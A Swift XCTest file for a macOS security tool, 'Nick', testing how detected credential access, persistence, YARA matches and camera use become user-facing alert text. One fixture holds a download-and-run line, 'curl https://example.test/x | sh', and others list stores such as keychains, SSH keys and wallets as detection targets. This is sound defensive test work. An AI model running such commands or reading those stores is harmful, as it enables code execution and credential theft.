// MARK: - Nick
// Copyright © 2026 Ehsan Azish — github.com/EhsanAzish80
// Licensed under AGPL-3.0. See LICENSE for details.

import XCTest
@testable import Nick

final class UserFacingAlertBuilderTests: XCTestCase {

    func test_credentialAccessUsesBehaviorFirstTitleWithActorAndViaChain() {
        let process = NickProcessInfo(
            pid: 8_101,
            path: "/usr/bin/security",
            name: "security",
            parentPID: 8_100,
            parentName: "CodexCLI",
            signingStatus: .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.security"),
            metadata: ProcessMetadata(arguments: [])
        )
        let signal = ThreatSignal(
            source: .endpointSecurity,
            severity: .critical,
            title: "Read a Keychain secret",
            description: "Credential access evidence",
            context: ThreatSignalContext(
                processInfo: process,
                metadata: [
                    "detectionKind": "credential-access",
                    "reason": "keychain_secret_read",
                    "credentialStore": CredentialAccessPolicy.Store.keychain.rawValue,
                    "responsibleChain": "ChatGPT → Codex CLI → security",
                    "ruleTier": "protected"
                ]
            )
        )
        let alert = ThreatAlert(
            score: 0.9,
            content: AlertContent(
                title: "Credential access needs review",
                description: "Credential access evidence",
                severity: .critical,
                recommendedAction: "Review"
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.headline, "Read a Keychain secret (security, via Codex CLI)")
        XCTAssertFalse(result.headline.contains("needs your review"))
        XCTAssertTrue(result.explanation.contains("security"))
        XCTAssertTrue(result.explanation.contains("ChatGPT → Codex CLI → security"))
        XCTAssertTrue(result.explanation.contains("stored Keychain secret"))
    }

    func testCredentialTitlesAreDerivedFromReasonForPersistedIncidents() {
        let cases = [
            ("credential_store_access", "Opened the Keychain"),
            ("keychain_store_transfer", "Copied the Keychain"),
            ("keychain_secret_read", "Read a Keychain secret"),
            ("keychain_command_correlation", "Read a Keychain secret"),
            ("keychain_dump", "Read a Keychain secret"),
            ("hidden_password_prompt", "Requested a hidden password")
        ]
        for (reason, expected) in cases {
            let signal = ThreatSignal(
                source: .endpointSecurity,
                severity: .critical,
                title: "Legacy stored title",
                description: "Legacy copy",
                context: ThreatSignalContext(
                    processInfo: NickProcessInfo(
                        pid: 42, path: "/usr/bin/security", name: "security",
                        parentPID: 1, parentName: "launchd", signingStatus: .unknown
                    ),
                    metadata: [
                        "detectionKind": "credential-access",
                        "reason": reason,
                        "credentialStore": CredentialAccessPolicy.Store.keychain.rawValue,
                        "ruleTier": "protected"
                    ]
                )
            )
            let alert = ThreatAlert(
                score: 0.9,
                content: .init(
                    title: "Legacy stored title", description: "Legacy copy",
                    severity: .critical, recommendedAction: "Review"
                ),
                contributingSignals: [signal]
            )
            XCTAssertTrue(
                UserFacingAlertBuilder.shared.build(from: alert).headline.hasPrefix(expected),
                reason
            )
        }
    }

    func testCredentialStoreAccessTitlesAreDerivedFromStoreReasonPair() {
        let cases: [(CredentialAccessPolicy.Store, String)] = [
            (.browserCookies, "Opened browser cookies"),
            (.browserLogins, "Opened saved browser logins"),
            (.keychain, "Opened the Keychain"),
            (.sshPrivateKey, "Opened an SSH private key"),
            (.cryptocurrencyWallet, "Opened cryptocurrency wallet data"),
            (.browserWallet, "Opened browser wallet data"),
            (.cloudCredential, "Opened cloud credentials"),
            (.messagingSession, "Opened a messaging session"),
            (.notesData, "Opened Notes data"),
            (.walletPass, "Opened Wallet passes"),
            (.passwordPrompt, "Requested a hidden password")
        ]
        for (store, expected) in cases {
            let signal = ThreatSignal(
                source: .endpointSecurity,
                severity: .medium,
                title: "Legacy stored title",
                description: "Legacy copy",
                context: ThreatSignalContext(metadata: [
                    "detectionKind": "credential-access",
                    "reason": "credential_store_access",
                    "credentialStore": store.rawValue,
                    "ruleTier": "review"
                ])
            )
            let alert = ThreatAlert(
                score: 0.5,
                content: .init(
                    title: "Legacy stored title", description: "Legacy copy",
                    severity: .medium, recommendedAction: "Review"
                ),
                contributingSignals: [signal]
            )
            XCTAssertTrue(
                UserFacingAlertBuilder.shared.build(from: alert).headline.hasPrefix(expected),
                store.rawValue
            )
        }
    }

    func test_behaviorIncidentOnPlatformShellHasNoFileRemediationAction() {
        let process = NickProcessInfo(
            pid: 1_842,
            path: "/bin/zsh",
            name: "zsh",
            parentPID: 1_060,
            parentName: "CodexCLI",
            signingStatus: .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh"),
            metadata: ProcessMetadata(arguments: [])
        )
        let signal = ThreatSignal(
            source: .endpointSecurity,
            severity: .critical,
            title: "Download-to-shell command detected",
            description: "Behavior evidence",
            context: ThreatSignalContext(
                processInfo: process,
                fileInfo: FileInfo(path: "/bin/zsh", sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
                metadata: [
                    "reason": "curl_pipe_shell",
                    "class": "behavior",
                    "detectionKind": "lolbin-behavior",
                    "matchedCommand": "curl https://example.test/x | sh"
                ]
            )
        )
        let alert = ThreatAlert(
            score: 0.9,
            content: AlertContent(
                title: "Download-to-shell command detected",
                description: "Behavior evidence",
                severity: .critical,
                recommendedAction: "Review"
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertNil(alert.remediableFilePath)
        XCTAssertFalse(result.actions.contains(.quarantine))
        XCTAssertTrue(result.explanation.contains("Nick saw a shell run"))
        XCTAssertFalse(result.explanation.lowercased().contains("file content"))
    }

    func test_eicarDetectionUsesExplicitTestFileLabel() {
        let alert = ThreatAlert(
            score: 0.9,
            content: AlertContent(
                title: "EICAR Anti-Malware Test File",
                description: "Exact hash match",
                severity: .high,
                recommendedAction: "Review"
            ),
            contributingSignals: []
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.headline, "EICAR test file")
        XCTAssertEqual(result.assessment, "Test detection")
        XCTAssertTrue(result.explanation.contains("harmless EICAR antivirus test signature"))
    }

    func test_legacyShazamdAttribution_isInformational() {
        let alert = makeCaptureAlert(
            processName: "shazamd",
            path: "/Library/Developer/CoreSimulator/Volumes/iOS_Test/RuntimeRoot/System/Library/Frameworks/ShazamKit.framework/shazamd",
            signingStatus: .adHoc,
            severity: .info,
            attributionConfidence: "unavailable"
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.severity, .safe)
        XCTAssertEqual(result.assessment, "Informational activity")
        XCTAssertTrue(result.headline.contains("became active"))
        XCTAssertTrue(result.explanation.contains("were not evidence"))
        XCTAssertTrue(result.recommendedAction.contains("Driftor"))
        XCTAssertFalse(result.actions.contains(.quarantine))
    }

    func test_unverifiedUnsignedCapture_doesNotAccuseOrRecommendDeletion() {
        let alert = makeCaptureAlert(
            processName: "unknown-camera-tool",
            path: "/tmp/unknown-camera-tool",
            signingStatus: .unsigned,
            severity: .high,
            attributionConfidence: "unavailable"
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.severity, .safe)
        XCTAssertEqual(result.assessment, "Informational activity")
        XCTAssertTrue(result.explanation.contains("were not evidence"))
        XCTAssertFalse(result.recommendedAction.lowercased().contains("delete"))
    }

    func test_contextualCapture_namesForegroundAppWithoutClaimingOwnership() {
        let alert = makeCaptureAlert(
            processName: "Photo Booth",
            path: "/System/Applications/Photo Booth.app/Contents/MacOS/Photo Booth",
            signingStatus: .signed(teamID: "APPLE_PLATFORM"),
            severity: .info,
            attributionConfidence: "contextual"
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.headline, "HD Web Camera became active while Photo Booth was frontmost")
        XCTAssertTrue(result.explanation.contains("not proof"))
        XCTAssertFalse(result.explanation.contains("attributed the activity"))
        XCTAssertEqual(result.severity, .safe)
    }

    func test_inactiveCapture_isPresentedAsStopped() {
        let alert = makeCaptureAlert(
            processName: "Voice Memos",
            path: "/System/Applications/VoiceMemos.app/Contents/MacOS/VoiceMemos",
            signingStatus: .signed(teamID: "APPLE_PLATFORM"),
            severity: .info,
            reason: "capture_device_inactive",
            attributionConfidence: "authoritative"
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.headline, "HD Web Camera became inactive")
        XCTAssertTrue(result.explanation.contains("stopped streaming"))
        XCTAssertEqual(result.assessment, "No longer active")
    }

    func test_genericFallback_doesNotClaimNickBlockedAnything() {
        let alert = ThreatAlert(
            score: 0.6,
            content: AlertContent(
                title: "Unclassified event",
                description: "A detector observed an unusual event.",
                severity: .medium,
                recommendedAction: "Review the event."
            ),
            contributingSignals: []
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertFalse(result.explanation.lowercased().contains("taken protective action"))
        XCTAssertFalse(result.explanation.lowercased().contains("blocked"))
        XCTAssertTrue(result.explanation.contains("does not by itself prove"))
    }

    func test_backgroundTaskLaunchItemUsesInstigatorAndOwningApp() {
        let path = "/Users/test/Library/LaunchAgents/com.example.sync.plist"
        let signal = ThreatSignal(
            source: .persistence,
            severity: .high,
            title: "Background item added",
            description: "BTM launch item",
            context: ThreatSignalContext(
                fileInfo: FileInfo(path: path, sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
                metadata: [
                    "appleEvent": "background-item-added",
                    "persistencePath": path,
                    "launchItemLabel": "com.example.sync",
                    "instigatorName": "installer-helper",
                    "responsibleAppName": "Example App"
                ]
            )
        )
        let alert = ThreatAlert(
            score: 0.8,
            content: AlertContent(
                title: "Persistence change",
                description: "Test",
                severity: .high,
                recommendedAction: "Review"
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(
            result.headline,
            "Added a launch agent: com.example.sync (installer-helper, via Example App)"
        )
        XCTAssertTrue(result.explanation.contains(path))
    }

    func test_backgroundTaskSystemInstigatorUsesMergedFIMWriterAttribution() {
        let path = "/Users/test/Library/LaunchAgents/com.example.sync.plist"
        let fim = ThreatSignal(
            source: .filesystem,
            severity: .high,
            title: "Launch item changed",
            description: "FIM evidence",
            context: ThreatSignalContext(
                processInfo: NickProcessInfo(
                    pid: 90, path: "/usr/libexec/PlistBuddy", name: "PlistBuddy",
                    parentPID: 80, parentName: "Terminal", signingStatus: .unknown
                ),
                fileInfo: FileInfo(path: path, sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
                metadata: ["fimStatus": "created", "responsibleAppName": "Terminal"]
            )
        )
        let btm = ThreatSignal(
            source: .persistence,
            severity: .high,
            title: "Background item added",
            description: "BTM evidence",
            context: ThreatSignalContext(
                fileInfo: FileInfo(path: path, sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
                metadata: [
                    "appleEvent": "background-item-added", "persistencePath": path,
                    "launchItemLabel": "com.example.sync", "instigatorName": "smd"
                ]
            )
        )
        let alert = ThreatAlert(
            score: 0.8,
            content: .init(title: "Persistence change", description: "Test", severity: .high, recommendedAction: "Review"),
            contributingSignals: [btm, fim]
        )
        XCTAssertEqual(
            UserFacingAlertBuilder.shared.build(from: alert).headline,
            "Added a launch agent: com.example.sync (PlistBuddy, via Terminal)"
        )
    }

    func testSimpleCatalogNeverUsesForbiddenFallbackTitles() {
        for reason in ["unknown_rule", "endpoint_management_observed", "storage-operation-completed"] {
            let signal = ThreatSignal(
                source: .endpointSecurity, severity: .info,
                title: "helper activity observed", description: "Observed",
                context: ThreatSignalContext(metadata: ["reason": reason, "ruleTier": "observed"])
            )
            let alert = ThreatAlert(
                score: 0.1,
                content: .init(title: "helper activity observed", description: "Observed", severity: .info, recommendedAction: "No action"),
                contributingSignals: [signal]
            )
            let presentation = UserFacingAlertBuilder.shared.build(from: alert)
            XCTAssertFalse(presentation.headline.lowercased().contains("needs your review"), reason)
            XCTAssertFalse(presentation.headline.lowercased().contains("activity observed"), reason)
        }
    }

    func test_nickTemporaryBuildYARAMatch_isSafeDeveloperActivity() {
        let path = "/private/tmp/NickPerformanceAuditTests/Build/Products/Debug/Nick.app/Contents/MacOS/Nick.debug.dylib"
        let signal = ThreatSignal(
            source: .yara,
            severity: .high,
            title: "YARA match: macos_launchagent_install",
            description: "Matched a persistence heuristic.",
            context: ThreatSignalContext(
                fileInfo: FileInfo(
                    path: path,
                    sha256Hash: nil,
                    entropy: nil,
                    signingStatus: nil,
                    sizeBytes: nil
                ),
                metadata: ["yaraRules": "macos_launchagent_install"]
            )
        )
        let alert = ThreatAlert(
            score: 0.9,
            content: AlertContent(
                title: "Known threat detected",
                description: "YARA match",
                severity: .high,
                recommendedAction: "Quarantine."
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.severity, .safe)
        XCTAssertEqual(result.assessment, "Safe developer activity")
        XCTAssertFalse(result.actions.contains(.quarantine))
    }

    func test_mediumYARAHeuristic_isReviewNotKnownMalware() {
        let signal = ThreatSignal(
            source: .yara,
            severity: .medium,
            title: "YARA match: macos_launchagent_install",
            description: "Matched a persistence heuristic.",
            context: ThreatSignalContext(
                fileInfo: FileInfo(
                    path: "/Users/test/Downloads/Installer",
                    sha256Hash: nil,
                    entropy: nil,
                    signingStatus: nil,
                    sizeBytes: nil
                ),
                metadata: ["yaraRules": "macos_launchagent_install"]
            )
        )
        let alert = ThreatAlert(
            score: 0.7,
            content: AlertContent(
                title: "Known threat detected",
                description: "YARA match",
                severity: .medium,
                recommendedAction: "Review."
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.severity, .warning)
        XCTAssertTrue(result.headline.contains("suspicious behavior"))
        XCTAssertTrue(result.explanation.contains("not a confirmed malware detection"))
        XCTAssertTrue(result.actions.contains(.quarantine))
        XCTAssertTrue(result.actions.contains(.allowOnce))
        XCTAssertTrue(result.actions.contains(.keepBlocked))
    }

    func test_highYARAHeuristic_isStillReviewableAndNeverAutoQuarantine() {
        let process = NickProcessInfo(
            pid: 42,
            path: "/Applications/Xcode.app/Contents/SharedFrameworks/XCBuild.framework/XCBuild",
            name: "SWBBuildService",
            parentPID: 1,
            parentName: "Xcode",
            signingStatus: .signed(teamID: "APPLE"),
            metadata: ProcessMetadata()
        )
        let signal = ThreatSignal(
            source: .yara,
            severity: .critical,
            title: "YARA match: macos_mass_file_rename",
            description: "Matched a behavioral rule.",
            context: ThreatSignalContext(
                processInfo: process,
                fileInfo: FileInfo(
                    path: "/Users/test/Library/Developer/Xcode/DerivedData/App/Build/Products/Debug/App",
                    sha256Hash: "changing-build-hash",
                    entropy: nil,
                    signingStatus: nil,
                    sizeBytes: nil
                ),
                metadata: ["yaraRules": "macos_mass_file_rename"]
            )
        )
        let alert = ThreatAlert(
            score: 0.95,
            content: AlertContent(
                title: "Known threat detected",
                description: "YARA match",
                severity: .critical,
                recommendedAction: "Quarantine."
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.severity, .warning)
        XCTAssertEqual(result.assessment, "Needs your review")
        XCTAssertTrue(result.explanation.contains("not a confirmed malware"))
        XCTAssertTrue(result.actions.contains(.quarantine))
        XCTAssertTrue(result.actions.contains(.allowOnce))
        XCTAssertTrue(result.actions.contains(.keepBlocked))
    }

    func test_developerCommand_namesParentAndDoesNotCallToolMalware() {
        let process = NickProcessInfo(
            pid: 100,
            path: "/usr/bin/curl",
            name: "curl",
            parentPID: 99,
            parentName: "Xcode",
            signingStatus: .signed(teamID: "APPLE")
        )
        let signal = ThreatSignal(
            source: .process,
            severity: .medium,
            title: "Suspicious parent-child relationship",
            description: "Test",
            context: ThreatSignalContext(
                processInfo: process,
                metadata: ["reason": "suspicious_parent_child"]
            )
        )
        let alert = ThreatAlert(
            score: 0.65,
            content: AlertContent(
                title: "curl needs review",
                description: "Test",
                severity: .medium,
                recommendedAction: "Review"
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.assessment, "Likely developer activity")
        XCTAssertTrue(result.explanation.contains("Xcode started curl"))
        XCTAssertTrue(result.explanation.contains("common during builds"))
        XCTAssertFalse(result.explanation.lowercased().contains("curl is malware"))
    }

    func test_signedInstalledUpdaterYARA_isPresentedAsRuleMatchNotMalwareIdentity() {
        let path = "/Applications/GoogleUpdater.app/Contents/MacOS/GoogleUpdater"
        let process = NickProcessInfo(
            pid: 101,
            path: path,
            name: "GoogleUpdater",
            parentPID: 1,
            parentName: "launchd",
            signingStatus: .signed(teamID: "EQHXZ8M8AV")
        )
        let signal = ThreatSignal(
            source: .yara,
            severity: .high,
            title: "YARA match: updater_heuristic",
            description: "Matched updater behavior",
            context: ThreatSignalContext(
                processInfo: process,
                fileInfo: FileInfo(
                    path: path,
                    sha256Hash: nil,
                    entropy: nil,
                    signingStatus: .signed(teamID: "EQHXZ8M8AV"),
                    sizeBytes: nil
                ),
                metadata: ["yaraRules": "updater_heuristic"]
            )
        )
        let alert = ThreatAlert(
            score: 0.85,
            content: AlertContent(
                title: "Known threat detected",
                description: "Test",
                severity: .high,
                recommendedAction: "Quarantine"
            ),
            contributingSignals: [signal]
        )

        let result = UserFacingAlertBuilder.shared.build(from: alert)

        XCTAssertEqual(result.headline, "Signed software matched a detection rule")
        XCTAssertTrue(result.explanation.contains("not proof of malware"))
        XCTAssertEqual(result.assessment, "Needs your review")
    }

    private func makeCaptureAlert(
        processName: String,
        path: String,
        signingStatus: SigningStatus,
        severity: SignalSeverity,
        reason: String = "capture_device_active",
        attributionConfidence: String = "authoritative"
    ) -> ThreatAlert {
        let process = NickProcessInfo(
            pid: 68348,
            path: path,
            name: processName,
            parentPID: 1,
            parentName: nil,
            signingStatus: signingStatus,
            metadata: ProcessMetadata()
        )
        let signal = ThreatSignal(
            source: .avCapture,
            severity: severity,
            title: "HD Web Camera activated by \(processName)",
            description: "Capture activity",
            context: ThreatSignalContext(
                processInfo: process,
                metadata: [
                    "deviceName": "HD Web Camera",
                    "mediaType": "camera",
                    "process": processName,
                    "reason": reason,
                    "attributionConfidence": attributionConfidence
                ]
            )
        )
        return ThreatAlert(
            score: severity == .info ? 0.2 : 0.85,
            content: AlertContent(
                title: "Camera or microphone activity needs review",
                description: "HD Web Camera became active.",
                severity: severity,
                recommendedAction: "Review camera access."
            ),
            contributingSignals: [signal]
        )
    }
}
